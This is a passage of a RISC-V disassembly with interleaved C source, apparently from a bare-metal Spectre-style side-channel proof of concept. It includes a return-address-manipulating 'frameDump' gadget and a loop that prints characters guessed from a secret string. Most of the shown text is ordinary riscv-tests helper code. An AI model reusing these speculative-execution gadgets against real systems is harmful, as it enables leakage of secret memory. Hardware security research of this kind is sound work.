                                                           hitArray[1], output[1], output[1]); 
    80001436:	fa144703          	lbu	a4,-95(s0)
        printf("\033[0;32;32mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000143a:	2701                	sext.w	a4,a4
    8000143c:	e43a                	sd	a4,8(sp)
    8000143e:	e03e                	sd	a5,0(sp)
    80001440:	87aa                	mv	a5,a0
    80001442:	8732                	mv	a4,a2
    80001444:	fe043603          	ld	a2,-32(s0)
    80001448:	00001517          	auipc	a0,0x1
    8000144c:	37050513          	addi	a0,a0,880 # 800027b8 <atol+0x176>
    80001450:	5cb000ef          	jal	ra,8000221a <printf>
    80001454:	a0a5                	j	800014bc <main+0x262>
        else 
        printf("\033[0;32;31mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001456:	00001797          	auipc	a5,0x1
    8000145a:	5e278793          	addi	a5,a5,1506 # 80002a38 <secretString>
    8000145e:	6398                	ld	a4,0(a5)
        (uint8_t*)(secretString + offset), offset,secretString[offset], hitArray[0], output[0], output[0], 
    80001460:	fe043783          	ld	a5,-32(s0)
    80001464:	00f705b3          	add	a1,a4,a5
    80001468:	00001797          	auipc	a5,0x1
    8000146c:	5d078793          	addi	a5,a5,1488 # 80002a38 <secretString>
    80001470:	6398                	ld	a4,0(a5)
    80001472:	fe043783          	ld	a5,-32(s0)
    80001476:	97ba                	add	a5,a5,a4
    80001478:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;31mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000147c:	0007869b          	sext.w	a3,a5
    80001480:	f9043603          	ld	a2,-112(s0)
        (uint8_t*)(secretString + offset), offset,secretString[offset], hitArray[0], output[0], output[0], 
    80001484:	fa044783          	lbu	a5,-96(s0)
        printf("\033[0;32;31mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001488:	0007851b          	sext.w	a0,a5
        (uint8_t*)(secretString + offset), offset,secretString[offset], hitArray[0], output[0], output[0], 
    8000148c:	fa044783          	lbu	a5,-96(s0)
        printf("\033[0;32;31mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001490:	0007881b          	sext.w	a6,a5
    80001494:	f9843883          	ld	a7,-104(s0)
                                                           hitArray[1], output[1], output[1]);  
    80001498:	fa144783          	lbu	a5,-95(s0)
        printf("\033[0;32;31mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000149c:	2781                	sext.w	a5,a5
                                                           hitArray[1], output[1], output[1]);  
    8000149e:	fa144703          	lbu	a4,-95(s0)
        printf("\033[0;32;31mvaddr[%010p]:offset(%lu): want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014a2:	2701                	sext.w	a4,a4
    800014a4:	e43a                	sd	a4,8(sp)
    800014a6:	e03e                	sd	a5,0(sp)
    800014a8:	87aa                	mv	a5,a0
    800014aa:	8732                	mv	a4,a2
    800014ac:	fe043603          	ld	a2,-32(s0)
    800014b0:	00001517          	auipc	a0,0x1
    800014b4:	37850513          	addi	a0,a0,888 # 80002828 <atol+0x1e6>
    800014b8:	563000ef          	jal	ra,8000221a <printf>
    for (uint64_t offset = 0; offset < SECRET_SZ; ++offset){
    800014bc:	fe043783          	ld	a5,-32(s0)
    800014c0:	0785                	addi	a5,a5,1
    800014c2:	fef43023          	sd	a5,-32(s0)
    800014c6:	fe043703          	ld	a4,-32(s0)
    800014ca:	47e5                	li	a5,25
    800014cc:	dce7f2e3          	bleu	a4,a5,80001290 <main+0x36>
    800014d0:	4781                	li	a5,0
    }
}
    800014d2:	853e                	mv	a0,a5
    800014d4:	70e6                	ld	ra,120(sp)
    800014d6:	7446                	ld	s0,112(sp)
    800014d8:	6109                	addi	sp,sp,128
    800014da:	8082                	ret

00000000800014dc <frameDump>:
    800014dc:	70e2                	ld	ra,56(sp)
    800014de:	6121                	addi	sp,sp,64
    800014e0:	10f9                	addi	ra,ra,-2
    800014e2:	00200313          	li	t1,2
    800014e6:	00431393          	slli	t2,t1,0x4
    800014ea:	d0337753          	fcvt.s.lu	fa4,t1
    800014ee:	d033f7d3          	fcvt.s.lu	fa5,t2
    800014f2:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800014f6:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800014fa:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    800014fe:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001502:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
    80001506:	909e                	add	ra,ra,t2
    80001508:	8082                	ret

000000008000150a <printArray>:
#include <stdint.h>

#define static_assert(cond) switch(0) { case 0: case !!(long)(cond): ; }

static void printArray(const char name[], int n, const int arr[])
{
    8000150a:	7179                	addi	sp,sp,-48
    8000150c:	f422                	sd	s0,40(sp)
    8000150e:	1800                	addi	s0,sp,48
    80001510:	fea43423          	sd	a0,-24(s0)
    80001514:	87ae                	mv	a5,a1
    80001516:	fcc43c23          	sd	a2,-40(s0)
    8000151a:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %3d ", arr[i] );
  printf( "\n" );
#endif
}
    8000151e:	0001                	nop
    80001520:	7422                	ld	s0,40(sp)
    80001522:	6145                	addi	sp,sp,48
    80001524:	8082                	ret

0000000080001526 <printDoubleArray>:

static void printDoubleArray(const char name[], int n, const double arr[])
{
    80001526:	7179                	addi	sp,sp,-48
    80001528:	f422                	sd	s0,40(sp)
    8000152a:	1800                	addi	s0,sp,48
    8000152c:	fea43423          	sd	a0,-24(s0)
    80001530:	87ae                	mv	a5,a1
    80001532:	fcc43c23          	sd	a2,-40(s0)
    80001536:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %g ", arr[i] );
  printf( "\n" );
#endif
}
    8000153a:	0001                	nop
    8000153c:	7422                	ld	s0,40(sp)
    8000153e:	6145                	addi	sp,sp,48
    80001540:	8082                	ret

0000000080001542 <verify>:

static int verify(int n, const volatile int* test, const int* verify)
{
    80001542:	715d                	addi	sp,sp,-80
    80001544:	e4a2                	sd	s0,72(sp)
    80001546:	0880                	addi	s0,sp,80
    80001548:	87aa                	mv	a5,a0
    8000154a:	fcb43023          	sd	a1,-64(s0)
    8000154e:	fac43c23          	sd	a2,-72(s0)
    80001552:	fcf42623          	sw	a5,-52(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    80001556:	fe042623          	sw	zero,-20(s0)
    8000155a:	a071                	j	800015e6 <verify+0xa4>
  {
    int t0 = test[i], t1 = test[i+1];
    8000155c:	fec42783          	lw	a5,-20(s0)
    80001560:	078a                	slli	a5,a5,0x2
    80001562:	fc043703          	ld	a4,-64(s0)
    80001566:	97ba                	add	a5,a5,a4
    80001568:	439c                	lw	a5,0(a5)
    8000156a:	fef42423          	sw	a5,-24(s0)
    8000156e:	fec42783          	lw	a5,-20(s0)
    80001572:	0785                	addi	a5,a5,1
    80001574:	078a                	slli	a5,a5,0x2
    80001576:	fc043703          	ld	a4,-64(s0)
    8000157a:	97ba                	add	a5,a5,a4
    8000157c:	439c                	lw	a5,0(a5)
    8000157e:	fef42223          	sw	a5,-28(s0)
    int v0 = verify[i], v1 = verify[i+1];
    80001582:	fec42783          	lw	a5,-20(s0)
    80001586:	078a                	slli	a5,a5,0x2
    80001588:	fb843703          	ld	a4,-72(s0)
    8000158c:	97ba                	add	a5,a5,a4
    8000158e:	439c                	lw	a5,0(a5)
    80001590:	fef42023          	sw	a5,-32(s0)
    80001594:	fec42783          	lw	a5,-20(s0)
    80001598:	0785                	addi	a5,a5,1
    8000159a:	078a                	slli	a5,a5,0x2
    8000159c:	fb843703          	ld	a4,-72(s0)
    800015a0:	97ba                	add	a5,a5,a4
    800015a2:	439c                	lw	a5,0(a5)
    800015a4:	fcf42e23          	sw	a5,-36(s0)
    if (t0 != v0) return i+1;
    800015a8:	fe842703          	lw	a4,-24(s0)
    800015ac:	fe042783          	lw	a5,-32(s0)
    800015b0:	2701                	sext.w	a4,a4
    800015b2:	2781                	sext.w	a5,a5
    800015b4:	00f70763          	beq	a4,a5,800015c2 <verify+0x80>
    800015b8:	fec42783          	lw	a5,-20(s0)
    800015bc:	2785                	addiw	a5,a5,1
    800015be:	2781                	sext.w	a5,a5
    800015c0:	a051                	j	80001644 <verify+0x102>
    if (t1 != v1) return i+2;
    800015c2:	fe442703          	lw	a4,-28(s0)
    800015c6:	fdc42783          	lw	a5,-36(s0)
    800015ca:	2701                	sext.w	a4,a4
    800015cc:	2781                	sext.w	a5,a5
    800015ce:	00f70763          	beq	a4,a5,800015dc <verify+0x9a>
    800015d2:	fec42783          	lw	a5,-20(s0)
    800015d6:	2789                	addiw	a5,a5,2
    800015d8:	2781                	sext.w	a5,a5
    800015da:	a0ad                	j	80001644 <verify+0x102>
  for (i = 0; i < n/2*2; i+=2)
    800015dc:	fec42783          	lw	a5,-20(s0)
    800015e0:	2789                	addiw	a5,a5,2
    800015e2:	fef42623          	sw	a5,-20(s0)
    800015e6:	fcc42783          	lw	a5,-52(s0)
    800015ea:	01f7d71b          	srliw	a4,a5,0x1f
    800015ee:	9fb9                	addw	a5,a5,a4
    800015f0:	4017d79b          	sraiw	a5,a5,0x1
    800015f4:	2781                	sext.w	a5,a5
    800015f6:	0017979b          	slliw	a5,a5,0x1
    800015fa:	0007871b          	sext.w	a4,a5
    800015fe:	fec42783          	lw	a5,-20(s0)
    80001602:	2781                	sext.w	a5,a5
    80001604:	f4e7cce3          	blt	a5,a4,8000155c <verify+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    80001608:	fcc42783          	lw	a5,-52(s0)
    8000160c:	8b85                	andi	a5,a5,1
    8000160e:	2781                	sext.w	a5,a5
    80001610:	cb8d                	beqz	a5,80001642 <verify+0x100>
    80001612:	fcc42783          	lw	a5,-52(s0)
    80001616:	078a                	slli	a5,a5,0x2
    80001618:	17f1                	addi	a5,a5,-4
    8000161a:	fc043703          	ld	a4,-64(s0)
    8000161e:	97ba                	add	a5,a5,a4
    80001620:	439c                	lw	a5,0(a5)
    80001622:	0007869b          	sext.w	a3,a5
    80001626:	fcc42783          	lw	a5,-52(s0)
    8000162a:	078a                	slli	a5,a5,0x2
    8000162c:	17f1                	addi	a5,a5,-4
    8000162e:	fb843703          	ld	a4,-72(s0)
    80001632:	97ba                	add	a5,a5,a4
    80001634:	439c                	lw	a5,0(a5)
    80001636:	8736                	mv	a4,a3
    80001638:	00f70563          	beq	a4,a5,80001642 <verify+0x100>
    return n;
    8000163c:	fcc42783          	lw	a5,-52(s0)
    80001640:	a011                	j	80001644 <verify+0x102>
  return 0;
    80001642:	4781                	li	a5,0
}
    80001644:	853e                	mv	a0,a5
    80001646:	6426                	ld	s0,72(sp)
    80001648:	6161                	addi	sp,sp,80
    8000164a:	8082                	ret

000000008000164c <verifyDouble>:

static int verifyDouble(int n, const volatile double* test, const double* verify)
{
    8000164c:	711d                	addi	sp,sp,-96
    8000164e:	eca2                	sd	s0,88(sp)
    80001650:	1080                	addi	s0,sp,96
    80001652:	87aa                	mv	a5,a0
    80001654:	fab43823          	sd	a1,-80(s0)
    80001658:	fac43423          	sd	a2,-88(s0)
    8000165c:	faf42e23          	sw	a5,-68(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    80001660:	fe042623          	sw	zero,-20(s0)
    80001664:	a065                	j	8000170c <verifyDouble+0xc0>
  {
    double t0 = test[i], t1 = test[i+1];
    80001666:	fec42783          	lw	a5,-20(s0)
    8000166a:	078e                	slli	a5,a5,0x3
    8000166c:	fb043703          	ld	a4,-80(s0)
    80001670:	97ba                	add	a5,a5,a4
    80001672:	239c                	fld	fa5,0(a5)
    80001674:	fef43027          	fsd	fa5,-32(s0)
    80001678:	fec42783          	lw	a5,-20(s0)
    8000167c:	0785                	addi	a5,a5,1
    8000167e:	078e                	slli	a5,a5,0x3
    80001680:	fb043703          	ld	a4,-80(s0)
    80001684:	97ba                	add	a5,a5,a4
    80001686:	239c                	fld	fa5,0(a5)
    80001688:	fcf43c27          	fsd	fa5,-40(s0)
    double v0 = verify[i], v1 = verify[i+1];
    8000168c:	fec42783          	lw	a5,-20(s0)
    80001690:	078e                	slli	a5,a5,0x3
    80001692:	fa843703          	ld	a4,-88(s0)
    80001696:	97ba                	add	a5,a5,a4
    80001698:	239c                	fld	fa5,0(a5)
    8000169a:	fcf43827          	fsd	fa5,-48(s0)
    8000169e:	fec42783          	lw	a5,-20(s0)
    800016a2:	0785                	addi	a5,a5,1
    800016a4:	078e                	slli	a5,a5,0x3
    800016a6:	fa843703          	ld	a4,-88(s0)
    800016aa:	97ba                	add	a5,a5,a4
    800016ac:	239c                	fld	fa5,0(a5)
    800016ae:	fcf43427          	fsd	fa5,-56(s0)
    int eq1 = t0 == v0, eq2 = t1 == v1;
    800016b2:	fe043707          	fld	fa4,-32(s0)
    800016b6:	fd043787          	fld	fa5,-48(s0)
    800016ba:	a2f727d3          	feq.d	a5,fa4,fa5
    800016be:	00f037b3          	snez	a5,a5
    800016c2:	0ff7f793          	andi	a5,a5,255
    800016c6:	fcf42223          	sw	a5,-60(s0)
    800016ca:	fd843707          	fld	fa4,-40(s0)
    800016ce:	fc843787          	fld	fa5,-56(s0)
    800016d2:	a2f727d3          	feq.d	a5,fa4,fa5
    800016d6:	00f037b3          	snez	a5,a5
    800016da:	0ff7f793          	andi	a5,a5,255
    800016de:	fcf42023          	sw	a5,-64(s0)
    if (!(eq1 & eq2)) return i+1+eq1;
    800016e2:	fc442703          	lw	a4,-60(s0)
    800016e6:	fc042783          	lw	a5,-64(s0)
    800016ea:	8ff9                	and	a5,a5,a4
    800016ec:	2781                	sext.w	a5,a5
    800016ee:	eb91                	bnez	a5,80001702 <verifyDouble+0xb6>
    800016f0:	fec42783          	lw	a5,-20(s0)
    800016f4:	2785                	addiw	a5,a5,1
    800016f6:	2781                	sext.w	a5,a5
    800016f8:	fc442703          	lw	a4,-60(s0)
    800016fc:	9fb9                	addw	a5,a5,a4
    800016fe:	2781                	sext.w	a5,a5
    80001700:	a09d                	j	80001766 <verifyDouble+0x11a>
  for (i = 0; i < n/2*2; i+=2)
    80001702:	fec42783          	lw	a5,-20(s0)
    80001706:	2789                	addiw	a5,a5,2
    80001708:	fef42623          	sw	a5,-20(s0)
    8000170c:	fbc42783          	lw	a5,-68(s0)
    80001710:	01f7d71b          	srliw	a4,a5,0x1f
    80001714:	9fb9                	addw	a5,a5,a4
    80001716:	4017d79b          	sraiw	a5,a5,0x1
    8000171a:	2781                	sext.w	a5,a5
    8000171c:	0017979b          	slliw	a5,a5,0x1
    80001720:	0007871b          	sext.w	a4,a5
    80001724:	fec42783          	lw	a5,-20(s0)
    80001728:	2781                	sext.w	a5,a5
    8000172a:	f2e7cee3          	blt	a5,a4,80001666 <verifyDouble+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    8000172e:	fbc42783          	lw	a5,-68(s0)
    80001732:	8b85                	andi	a5,a5,1
    80001734:	2781                	sext.w	a5,a5
    80001736:	c79d                	beqz	a5,80001764 <verifyDouble+0x118>
    80001738:	fbc42783          	lw	a5,-68(s0)
    8000173c:	078e                	slli	a5,a5,0x3
    8000173e:	17e1                	addi	a5,a5,-8
    80001740:	fb043703          	ld	a4,-80(s0)
    80001744:	97ba                	add	a5,a5,a4
    80001746:	2398                	fld	fa4,0(a5)
    80001748:	fbc42783          	lw	a5,-68(s0)
    8000174c:	078e                	slli	a5,a5,0x3
    8000174e:	17e1                	addi	a5,a5,-8
    80001750:	fa843703          	ld	a4,-88(s0)
    80001754:	97ba                	add	a5,a5,a4
    80001756:	239c                	fld	fa5,0(a5)
    80001758:	a2f727d3          	feq.d	a5,fa4,fa5
    8000175c:	e781                	bnez	a5,80001764 <verifyDouble+0x118>
    return n;
    8000175e:	fbc42783          	lw	a5,-68(s0)
    80001762:	a011                	j	80001766 <verifyDouble+0x11a>
  return 0;
    80001764:	4781                	li	a5,0
}
    80001766:	853e                	mv	a0,a5
    80001768:	6466                	ld	s0,88(sp)
    8000176a:	6125                	addi	sp,sp,96
    8000176c:	8082                	ret

000000008000176e <barrier>:

static void __attribute__((noinline)) barrier(int ncores)
{
    8000176e:	1101                	addi	sp,sp,-32
    80001770:	ec22                	sd	s0,24(sp)
    80001772:	1000                	addi	s0,sp,32
    80001774:	87aa                	mv	a5,a0
    80001776:	fef42623          	sw	a5,-20(s0)
  static volatile int sense;
  static volatile int count;
  static __thread int threadsense;

  __sync_synchronize();
    8000177a:	0ff0000f          	fence

  threadsense = !threadsense;
    8000177e:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    80001782:	0017b793          	seqz	a5,a5
    80001786:	0ff7f793          	andi	a5,a5,255
    8000178a:	0007871b          	sext.w	a4,a5
    8000178e:	00e22023          	sw	a4,0(tp) # 0 <_tdata_begin>
  if (__sync_fetch_and_add(&count, 1) == ncores-1)
    80001792:	0001a797          	auipc	a5,0x1a
    80001796:	ace78793          	addi	a5,a5,-1330 # 8001b260 <count.2896>
    8000179a:	4705                	li	a4,1
    8000179c:	0f50000f          	fence	iorw,ow
    800017a0:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    800017a4:	0006879b          	sext.w	a5,a3
    800017a8:	0007871b          	sext.w	a4,a5
    800017ac:	fec42783          	lw	a5,-20(s0)
    800017b0:	37fd                	addiw	a5,a5,-1
    800017b2:	2781                	sext.w	a5,a5
    800017b4:	02f71063          	bne	a4,a5,800017d4 <barrier+0x66>
  {
    count = 0;
    800017b8:	0001a797          	auipc	a5,0x1a
    800017bc:	aa878793          	addi	a5,a5,-1368 # 8001b260 <count.2896>
    800017c0:	0007a023          	sw	zero,0(a5)
    sense = threadsense;
    800017c4:	00022703          	lw	a4,0(tp) # 0 <_tdata_begin>
    800017c8:	0001a797          	auipc	a5,0x1a
    800017cc:	a9c78793          	addi	a5,a5,-1380 # 8001b264 <sense.2895>
    800017d0:	c398                	sw	a4,0(a5)
    800017d2:	a829                	j	800017ec <barrier+0x7e>
  }
  else while(sense != threadsense)
    800017d4:	0001                	nop
    800017d6:	0001a797          	auipc	a5,0x1a
    800017da:	a8e78793          	addi	a5,a5,-1394 # 8001b264 <sense.2895>
    800017de:	439c                	lw	a5,0(a5)
    800017e0:	0007871b          	sext.w	a4,a5
    800017e4:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    800017e8:	fef717e3          	bne	a4,a5,800017d6 <barrier+0x68>
    ;

  __sync_synchronize();
    800017ec:	0ff0000f          	fence
}
    800017f0:	0001                	nop
    800017f2:	6462                	ld	s0,24(sp)
    800017f4:	6105                	addi	sp,sp,32
    800017f6:	8082                	ret

00000000800017f8 <lfsr>:

static uint64_t lfsr(uint64_t x)
{
    800017f8:	7179                	addi	sp,sp,-48
    800017fa:	f422                	sd	s0,40(sp)
    800017fc:	1800                	addi	s0,sp,48
    800017fe:	fca43c23          	sd	a0,-40(s0)
  uint64_t bit = (x ^ (x >> 1)) & 1;
    80001802:	fd843783          	ld	a5,-40(s0)
    80001806:	0017d713          	srli	a4,a5,0x1
    8000180a:	fd843783          	ld	a5,-40(s0)
    8000180e:	8fb9                	xor	a5,a5,a4
    80001810:	8b85                	andi	a5,a5,1
    80001812:	fef43423          	sd	a5,-24(s0)
  return (x >> 1) | (bit << 62);
    80001816:	fd843783          	ld	a5,-40(s0)
    8000181a:	0017d713          	srli	a4,a5,0x1
    8000181e:	fe843783          	ld	a5,-24(s0)
    80001822:	17fa                	slli	a5,a5,0x3e
    80001824:	8fd9                	or	a5,a5,a4
}
    80001826:	853e                	mv	a0,a5
    80001828:	7422                	ld	s0,40(sp)
    8000182a:	6145                	addi	sp,sp,48
    8000182c:	8082                	ret

000000008000182e <syscall>:

extern volatile uint64_t tohost;
extern volatile uint64_t fromhost;

static uintptr_t syscall(uintptr_t which, uint64_t arg0, uint64_t arg1, uint64_t arg2)
{
    8000182e:	7171                	addi	sp,sp,-176
    80001830:	f522                	sd	s0,168(sp)
    80001832:	1900                	addi	s0,sp,176
    80001834:	f6a43c23          	sd	a0,-136(s0)
    80001838:	f6b43823          	sd	a1,-144(s0)
    8000183c:	f6c43423          	sd	a2,-152(s0)
    80001840:	f6d43023          	sd	a3,-160(s0)
    80001844:	ff040793          	addi	a5,s0,-16
    80001848:	f4f43c23          	sd	a5,-168(s0)
    8000184c:	f5843783          	ld	a5,-168(s0)
    80001850:	f9078793          	addi	a5,a5,-112
    80001854:	03f78793          	addi	a5,a5,63
    80001858:	8399                	srli	a5,a5,0x6
    8000185a:	079a                	slli	a5,a5,0x6
  volatile uint64_t magic_mem[8] __attribute__((aligned(64)));
  magic_mem[0] = which;
    8000185c:	f7843703          	ld	a4,-136(s0)
    80001860:	e398                	sd	a4,0(a5)
  magic_mem[1] = arg0;
    80001862:	f7043703          	ld	a4,-144(s0)
    80001866:	e798                	sd	a4,8(a5)
  magic_mem[2] = arg1;
    80001868:	f6843703          	ld	a4,-152(s0)
    8000186c:	eb98                	sd	a4,16(a5)
  magic_mem[3] = arg2;
    8000186e:	f6043703          	ld	a4,-160(s0)
    80001872:	ef98                	sd	a4,24(a5)
  __sync_synchronize();
    80001874:	0ff0000f          	fence

  tohost = (uintptr_t)magic_mem;
    80001878:	86be                	mv	a3,a5
    8000187a:	fffff717          	auipc	a4,0xfffff
    8000187e:	78670713          	addi	a4,a4,1926 # 80001000 <tohost>
    80001882:	e314                	sd	a3,0(a4)
  while (fromhost == 0)
    80001884:	0001                	nop
    80001886:	fffff717          	auipc	a4,0xfffff
    8000188a:	7ba70713          	addi	a4,a4,1978 # 80001040 <fromhost>
    8000188e:	6318                	ld	a4,0(a4)
    80001890:	db7d                	beqz	a4,80001886 <syscall+0x58>
    ;
  fromhost = 0;
    80001892:	fffff717          	auipc	a4,0xfffff
    80001896:	7ae70713          	addi	a4,a4,1966 # 80001040 <fromhost>
    8000189a:	00073023          	sd	zero,0(a4)

  __sync_synchronize();
    8000189e:	0ff0000f          	fence
  return magic_mem[0];
    800018a2:	639c                	ld	a5,0(a5)
}
    800018a4:	853e                	mv	a0,a5
    800018a6:	742a                	ld	s0,168(sp)
    800018a8:	614d                	addi	sp,sp,176
    800018aa:	8082                	ret

00000000800018ac <setStats>:
#define NUM_COUNTERS 2
static uintptr_t counters[NUM_COUNTERS];
static char* counter_names[NUM_COUNTERS];

void setStats(int enable)
{
    800018ac:	715d                	addi	sp,sp,-80
    800018ae:	e4a2                	sd	s0,72(sp)
    800018b0:	0880                	addi	s0,sp,80
    800018b2:	87aa                	mv	a5,a0
    800018b4:	faf42e23          	sw	a5,-68(s0)
  int i = 0;
    800018b8:	fc042e23          	sw	zero,-36(s0)
    uintptr_t csr = read_csr(name); \
    if (!enable) { csr -= counters[i]; counter_names[i] = #name; } \
    counters[i++] = csr; \
  } while (0)

  READ_CTR(mcycle);
    800018bc:	fdc42783          	lw	a5,-36(s0)
    800018c0:	0007871b          	sext.w	a4,a5
    800018c4:	4785                	li	a5,1
    800018c6:	fee7cbe3          	blt	a5,a4,800018bc <setStats+0x10>
    800018ca:	b00027f3          	csrr	a5,mcycle
    800018ce:	fcf43823          	sd	a5,-48(s0)
    800018d2:	fd043783          	ld	a5,-48(s0)
    800018d6:	fef43423          	sd	a5,-24(s0)
    800018da:	fbc42783          	lw	a5,-68(s0)
    800018de:	2781                	sext.w	a5,a5
    800018e0:	ef8d                	bnez	a5,8000191a <setStats+0x6e>
    800018e2:	0001a717          	auipc	a4,0x1a
    800018e6:	95e70713          	addi	a4,a4,-1698 # 8001b240 <counters>
    800018ea:	fdc42783          	lw	a5,-36(s0)
    800018ee:	078e                	slli	a5,a5,0x3
    800018f0:	97ba                	add	a5,a5,a4
    800018f2:	639c                	ld	a5,0(a5)
    800018f4:	fe843703          	ld	a4,-24(s0)
    800018f8:	40f707b3          	sub	a5,a4,a5
    800018fc:	fef43423          	sd	a5,-24(s0)
    80001900:	0001a717          	auipc	a4,0x1a
    80001904:	95070713          	addi	a4,a4,-1712 # 8001b250 <counter_names>
    80001908:	fdc42783          	lw	a5,-36(s0)
    8000190c:	078e                	slli	a5,a5,0x3
    8000190e:	97ba                	add	a5,a5,a4
    80001910:	00001717          	auipc	a4,0x1
    80001914:	f8870713          	addi	a4,a4,-120 # 80002898 <atol+0x256>
    80001918:	e398                	sd	a4,0(a5)
    8000191a:	fdc42783          	lw	a5,-36(s0)
    8000191e:	0017871b          	addiw	a4,a5,1
    80001922:	fce42e23          	sw	a4,-36(s0)
    80001926:	0001a717          	auipc	a4,0x1a
    8000192a:	91a70713          	addi	a4,a4,-1766 # 8001b240 <counters>
    8000192e:	078e                	slli	a5,a5,0x3
    80001930:	97ba                	add	a5,a5,a4
    80001932:	fe843703          	ld	a4,-24(s0)
    80001936:	e398                	sd	a4,0(a5)
  READ_CTR(minstret);
    80001938:	fdc42783          	lw	a5,-36(s0)
    8000193c:	0007871b          	sext.w	a4,a5
    80001940:	4785                	li	a5,1
    80001942:	fee7cbe3          	blt	a5,a4,80001938 <setStats+0x8c>
    80001946:	b02027f3          	csrr	a5,minstret
    8000194a:	fcf43423          	sd	a5,-56(s0)
    8000194e:	fc843783          	ld	a5,-56(s0)
    80001952:	fef43023          	sd	a5,-32(s0)
    80001956:	fbc42783          	lw	a5,-68(s0)
    8000195a:	2781                	sext.w	a5,a5
    8000195c:	ef8d                	bnez	a5,80001996 <setStats+0xea>
    8000195e:	0001a717          	auipc	a4,0x1a
    80001962:	8e270713          	addi	a4,a4,-1822 # 8001b240 <counters>
    80001966:	fdc42783          	lw	a5,-36(s0)
    8000196a:	078e                	slli	a5,a5,0x3
    8000196c:	97ba                	add	a5,a5,a4
    8000196e:	639c                	ld	a5,0(a5)
    80001970:	fe043703          	ld	a4,-32(s0)
    80001974:	40f707b3          	sub	a5,a4,a5
    80001978:	fef43023          	sd	a5,-32(s0)
    8000197c:	0001a717          	auipc	a4,0x1a
    80001980:	8d470713          	addi	a4,a4,-1836 # 8001b250 <counter_names>
    80001984:	fdc42783          	lw	a5,-36(s0)
    80001988:	078e                	slli	a5,a5,0x3
    8000198a:	97ba                	add	a5,a5,a4
    8000198c:	00001717          	auipc	a4,0x1
    80001990:	f1470713          	addi	a4,a4,-236 # 800028a0 <atol+0x25e>
    80001994:	e398                	sd	a4,0(a5)
    80001996:	fdc42783          	lw	a5,-36(s0)
    8000199a:	0017871b          	addiw	a4,a5,1
    8000199e:	fce42e23          	sw	a4,-36(s0)
    800019a2:	0001a717          	auipc	a4,0x1a
    800019a6:	89e70713          	addi	a4,a4,-1890 # 8001b240 <counters>
    800019aa:	078e                	slli	a5,a5,0x3
    800019ac:	97ba                	add	a5,a5,a4
    800019ae:	fe043703          	ld	a4,-32(s0)
    800019b2:	e398                	sd	a4,0(a5)

#undef READ_CTR
}
    800019b4:	0001                	nop
    800019b6:	6426                	ld	s0,72(sp)
    800019b8:	6161                	addi	sp,sp,80
    800019ba:	8082                	ret

00000000800019bc <tohost_exit>:

void __attribute__((noreturn)) tohost_exit(uintptr_t code)
{
    800019bc:	1101                	addi	sp,sp,-32
    800019be:	ec22                	sd	s0,24(sp)
    800019c0:	1000                	addi	s0,sp,32
    800019c2:	fea43423          	sd	a0,-24(s0)
  tohost = (code << 1) | 1;
    800019c6:	fe843783          	ld	a5,-24(s0)
    800019ca:	0786                	slli	a5,a5,0x1
    800019cc:	0017e713          	ori	a4,a5,1
    800019d0:	fffff797          	auipc	a5,0xfffff
    800019d4:	63078793          	addi	a5,a5,1584 # 80001000 <tohost>
    800019d8:	e398                	sd	a4,0(a5)
  while (1);
    800019da:	a001                	j	800019da <tohost_exit+0x1e>

00000000800019dc <handle_trap>:
}

uintptr_t __attribute__((weak)) handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    800019dc:	7179                	addi	sp,sp,-48
    800019de:	f406                	sd	ra,40(sp)
    800019e0:	f022                	sd	s0,32(sp)
    800019e2:	1800                	addi	s0,sp,48
    800019e4:	fea43423          	sd	a0,-24(s0)
    800019e8:	feb43023          	sd	a1,-32(s0)
    800019ec:	fcc43c23          	sd	a2,-40(s0)
  tohost_exit(1337);
    800019f0:	53900513          	li	a0,1337
    800019f4:	fc9ff0ef          	jal	ra,800019bc <tohost_exit>

00000000800019f8 <exit>:
}

void exit(int code)
{
    800019f8:	1101                	addi	sp,sp,-32
    800019fa:	ec06                	sd	ra,24(sp)
    800019fc:	e822                	sd	s0,16(sp)
    800019fe:	1000                	addi	s0,sp,32
    80001a00:	87aa                	mv	a5,a0
    80001a02:	fef42623          	sw	a5,-20(s0)
  tohost_exit(code);
    80001a06:	fec42783          	lw	a5,-20(s0)
    80001a0a:	853e                	mv	a0,a5
    80001a0c:	fb1ff0ef          	jal	ra,800019bc <tohost_exit>

0000000080001a10 <abort>:
}

void abort()
{
    80001a10:	1141                	addi	sp,sp,-16
    80001a12:	e406                	sd	ra,8(sp)
    80001a14:	e022                	sd	s0,0(sp)
    80001a16:	0800                	addi	s0,sp,16
  exit(128 + SIGABRT);
    80001a18:	08600513          	li	a0,134
